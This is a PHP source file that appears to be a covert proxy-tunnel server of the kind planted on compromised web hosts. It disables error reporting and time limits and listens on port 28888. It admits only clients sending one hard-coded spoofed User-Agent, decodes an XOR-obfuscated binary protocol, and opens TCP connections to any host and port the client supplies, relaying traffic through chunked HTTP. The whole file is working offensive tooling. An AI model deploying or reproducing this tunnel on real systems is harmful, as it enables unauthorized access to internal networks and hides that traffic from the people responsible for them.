<?php

error_reporting(0);
ini_set('max_execution_time', 0);


// $GLOBALS["sockets"]["outer"][$clientId]
// $GLOBALS["sockets"]["inter"][$clientId]


function setGlobalOuterSock($clientId,$sock){
    $GLOBALS["sockets"]["outer"][$clientId] = $sock;
}

function setGlobalInterSock($clientId,$sock){
    $GLOBALS["sockets"]["inter"][$clientId] = $sock;
}

function getGlobalOuterSock($clientId){
    return $GLOBALS["sockets"]["outer"][$clientId];
}

function getGlobalInterSock($clientId){
    return $GLOBALS["sockets"]["inter"][$clientId];
}


function authCheck($agent,$contentType){

    if ($agent == NULL || $agent!="Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3") {
        return false;
    }
    if ($contentType == null) {
        return false;
    }
    return true;
}


function getPostData($data){
    $response = "HTTP/1.1 200 OK\r\n";
    $response .= "Content-Type: text/html\r\n";
    $response .= "Content-Length: " . strlen($data) . "\r\n";
    $response .= "\r\n";
    $response .= $data;
    return $response;
}

function getPostDataWithXAB($data,$ifStart,$ifEnd){
    $response = "";
    if($ifStart){
        $response = "HTTP/1.1 200 OK\r\n";
        $response .= "Content-Type: text/html\r\n";
        $response .= "X-Accel-Buffering: no\r\n";
        $response .= "Transfer-Encoding: chunked\r\n";
        $response .= "\r\n";
    }
    if($ifEnd){
        $response .= getChunkedBody_end($data);
    }else{
        $response .= getChunkedBody($data);
    }
    return $response;
}

function getChunkedBody_end($data){
    return "0\r\n\r\n";
}
function getChunkedBody($data){
    return dechex(strlen($data))."\r\n".$data."\r\n";
}


function handleConnect($socket){
    $clients = array($socket);
    $conclients = array();
    while (true) {
        $read_fds = $clients;
        $write_fds = $conclients;
        $except_fds = null;
        $num = socket_select($read_fds, $write_fds, $except_fds, null);
        if ($num > 0) {
            foreach ($read_fds as $sock) {
                if ($sock == $socket) { // 有新的客户端连接
                    $client = socket_accept($socket);
                    $clients[] = $client;
                } else { // 有客户端数据可读
                    $data = socket_read($sock, 8*1024);
                    if ($data === ""||$data === false ) { // 客户端连接关闭
                        $key = array_search($sock, $clients);
                        $clientId_inter = array_search($sock,$GLOBALS["sockets"]["inter"]);
                        if($clientId_inter){
                            $response = getPostDataWithXAB("",false,true);
                            socket_write(getGlobalOuterSock($clientId_inter), $response, strlen($response));
                        }
                        unset($clients[$key]);
                        socket_close($sock);
                    } elseif ($data !== "") { // 处理客户端发送的数据
                        $clientId_inter = array_search($sock,$GLOBALS["sockets"]["inter"]);
                        if ($clientId_inter){
                            $response = getPostDataWithXAB(marshal(newData($data)),false,false);
                            socket_write(getGlobalOuterSock($clientId_inter), $response, strlen($response));
                        }else{
                            list($headers, $body) = explode("\r\n\r\n", $data, 2);
                            $headerLines = explode("\r\n", $headers);
                            $headers = [];
                            foreach ($headerLines as $headerLine) {
                                list($header, $value) = explode(": ", $headerLine, 2);
                                $headers[$header] = $value;
                            }
                            if(!authCheck($headers["User-Agent"],$headers["Content-Type"])){
                                $response = getPostData("no");
                                socket_write($sock, $response, strlen($response));
                            }else{
                                if($body!=null){
                                    try {
                                        if ($headers["Content-Type"]=="application/plain") {
                                            $response = tryFullDuplex($body);
                                            socket_write($sock, $response, strlen($response));
                                        }else if ($headers["Content-Type"]=="application/octet-stream"){

                                        } else {
                                            $result = processDataUnary($body,$sock);
                                            if (is_resource($result) && get_resource_type($result) === 'Socket') {
                                                $clients[] = $result;
                                                $conclients[] = $result;
                                            }else if($result === false){
                                                //todo
                                            }
                                        }
                                    } catch (\Throwable $th) {
                                        //throw $th;
                                    }

                                }
                            }
                        }
                    }
                }
            }

        }
    }
}

function startServer(){
    $GLOBALS["serverSocket"] = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_bind($GLOBALS["serverSocket"], '0.0.0.0', 28888);
    socket_listen($GLOBALS["serverSocket"]);
    handleConnect($GLOBALS["serverSocket"]);
}

function stopServe(){
    socket_close($GLOBALS["serverSocket"]);
}

function tryFullDuplex($body){
    $data = substr($body,0,32);
    return getPostData($data);
}

function processDataBio(){


}


function processDataUnary($body,$client){
    $dataMap =  unmarshal($body);

    $clientId = implode(array_map('chr', $dataMap["id"]));
    $action = $dataMap["ac"];
    if (count($action) != 1) {
        return false;
    }
    /*
    ActionCreate byte = 0x00
    ActionData   byte = 0x01
    ActionDelete byte = 0x02
    ActionResp   byte = 0x03
    */
    
    if ($action[0] == 0x02) {
        $socket = getGlobalInterSock($clientId);//$GLOBALS[$clientId]["hs"];

        if ($socket != null) {
            socket_close($socket);
            unset($GLOBALS["sockets"]["inter"][$clientId]);
            socket_close($client);
            unset($GLOBALS["sockets"]["outer"][$clientId]);
        }
        return false;
    } else if ($action[0] == 0x01) {
        $socket = getGlobalInterSock($clientId);
        if ($socket == null) {
//            echo marshal(newDel());
            return false;
        }
        $data = $dataMap["dt"];
        if (count($data) != 0) {
            $data = implode(array_map('chr', $data));
            socket_write($socket, $data, strlen($data));
        }
        return true;
    }

//    header("X-Accel-Buffering: no");
//    die(marshal(newStatus(0x00)));
    $host = implode(array_map('chr', $dataMap["h"]));
    $port = intval(implode(array_map('chr', $dataMap["p"])));
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) {
        return false;
//        die(marshal(newStatus(0x01)));
    }
    $result = socket_connect($socket, $host, $port);
    if ($result === false) {
        return false;
//        die(marshal(newStatus(0x01)));
    }
    setGlobalInterSock($clientId,$socket);
    setGlobalOuterSock($clientId,$client);
    $response = getPostDataWithXAB(marshal(newStatus(0x00)),true,false);
    socket_write($client, $response, strlen($response));
    return $socket;

}



function newStatus($b) {
    $m = ["s"=>[$b]];
    return $m;
}
function newDel() {
    $m = ["ac"=>[0x02]];
    return $m;
}

function newData($buf) {
    $m = [];
    $m["ac"] = [0x01];
    $m["dt"] = array_map('ord', str_split($buf));
    return $m;
}

function bytesToU32($bytes) {
    return (($bytes[0] & 0xFF) << 24) |
            (($bytes[1] & 0xFF) << 16) |
            (($bytes[2] & 0xFF) << 8) |
            (($bytes[3] & 0xFF) << 0);
}

function u32toBytes($i) {
    $result = [];
    $result[0] = ($i >> 24);
    $result[1] = ($i >> 16);
    $result[2] = ($i >> 8);
    $result[3] = ($i /*>> 0*/);
    return $result;
}

function unmarshal($input){
    $data = unpack("Nlen/Cx",substr($input,0,4+1));
    // var_dump($data);
    $len = $data['len'];
    $x = $data['x'];
    if ($len > 1024 * 1024 * 32) {
        die("invalid len");
    }
    
    $bs_ = substr($input,4+1,$len);
    // var_dump($bs_);
    $bs = [];
    for($i = 0 ;$i < $len ; $i++){
        $bs[$i] = ord($bs_[$i]) ^ $x;
    }
    // var_dump($bs);

    $m = [];
    for($i = 0; $i < $len; ){
        $kLen = $bs[$i];
        $i += 1;
        if($i + $kLen >= $len || $kLen < 0 ){
            die("key len error");
        }
        $buf = array_slice($bs, $i, $kLen);
        // var_dump($buf);
        $key = implode(array_map('chr', $buf));
        // var_dump($key);
        $i += $kLen;

        if ($i + 4 >= $len) {
            die("value len error");
        }
        $buf = array_slice($bs, $i, 4);
        $vLen = bytesToU32($buf);
        $i += 4;
        if ($vLen < 0 || $i + $vLen > $len) {
            die("value error");
        }
        $value = array_slice($bs, $i, $vLen);
        $i += $vLen;
        // var_dump($value);

        $m[$key] = $value;
    }
    // var_dump($m);
    return $m;
}

function marshal($m){
    $buf = '';
    foreach ($m as $key => $value) {
        $keyLen = strlen($key);
        $packedKey = pack('Ca*', $keyLen, $key); 
        $packedValue = pack('N', count($value)) . implode(array_map('chr', $value)); 
        $buf .= $packedKey . $packedValue; 
    }

    // var_dump(bin2hex($buf));

    $data = array_map('ord', str_split($buf));
    // var_dump($data);
    $key = $data[count($data) / 2];
    $len = count($data);
    // var_dump($len);

    for ($i = 0; $i < $len; $i++) {
        $data[$i] = $data[$i] ^ $key;
    }
    $packedData = pack('Nc*', $len, $key, ...$data);

    // var_dump(bin2hex($packedData));
    // var_dump(array_map('ord', str_split($packedData)));
    return $packedData;
    
}

startServer();